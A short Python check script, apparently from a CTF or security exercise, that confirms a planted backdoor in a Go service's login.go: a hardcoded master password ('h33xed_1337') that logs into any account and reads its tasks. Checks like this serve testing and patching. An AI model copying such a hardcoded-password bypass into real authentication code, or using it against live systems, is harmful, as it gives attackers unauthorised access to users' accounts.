from lib import *

print('[CHECK] 2. [Бэкдор №2] `if reqUser.Password == "h33xed_1337"` в login.go')
s = requests.Session()
username = random_alphanumeric_string(25)
password = random_alphanumeric_string(25)

register(s, username, password)
login(s, username, password)
task_id = new_task(s, 'helloasdasdf', 'goodbye9289239')

# new session from zero
s = requests.Session()
login(s, username, 'h33xed_1337')  # cursed password
task_cont = get_task_detailed(s, task_id)
if 'helloasdasdf' in task_cont and 'goodbye9289239' in task_cont:
    print('[PASSED] 2. [Бэкдор №2] `if reqUser.Password == "h33xed_1337"` в login.go')
else:
    print('[FAIL]')